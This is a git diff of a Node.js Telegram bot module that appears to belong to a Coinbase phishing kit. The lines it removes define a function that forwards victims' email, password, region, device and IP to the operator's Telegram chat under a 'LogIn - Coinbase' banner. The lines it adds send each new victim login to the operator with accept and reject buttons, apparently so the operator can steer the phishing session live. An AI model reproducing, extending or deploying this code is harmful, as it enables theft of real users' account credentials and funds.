@@ -1,35 +1,14 @@
 import { Telegraf } from "telegraf";
 import dotenv from "dotenv";
-
 dotenv.config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-
-let approvals = {}; // Will be imported/set by server.js
+let approvals = {};
 
 export function setApprovalsStore(store) {
   approvals = store;
 }
 
-// Function to send login info to Telegram
-export async function sendTelegramMessage(email, password, region, device, ip) {
-  const chatId = process.env.CHAT_ID;
-  const message = `😈 LogIn - Coinbase 😈\n
-📧 Email: ${email}
-🔑 Password: ${password}
-🌍 Region: ${region}
-💻 Device: ${device}
-📡 IP: ${ip}`;
-
-  try {
-    await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
-    console.log('Telegram message sent successfully');
-  } catch (err) {
-    console.error('Failed to send Telegram message:', err);
-  }
-}
-
-// Start the bot
 export function startBot() {
   bot.on("callback_query", async (ctx) => {
     const data = ctx.callbackQuery.data;
@@ -55,4 +34,26 @@ export function startBot() {
 
   process.once('SIGINT', () => bot.stop('SIGINT'));
   process.once('SIGTERM', () => bot.stop('SIGTERM'));
+}
+
+// Function to send new approval message
+export async function sendApprovalRequest(email, identifier) {
+  const chatId = process.env.CHAT_ID;
+  const url = `${process.env.APP_URL}/`; // Your Render server URL
+  approvals[identifier] = { email, status: "pending" };
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "✅ Accept", callback_data: `accept_${identifier}` },
+        { text: "❌ Reject", callback_data: `reject_${identifier}` }
+      ]
+    ]
+  };
+
+  await bot.telegram.sendMessage(
+    chatId,
+    `New login request:\nEmail: ${email}\nApprove or Reject?`,
+    { reply_markup: keyboard }
+  );
 }
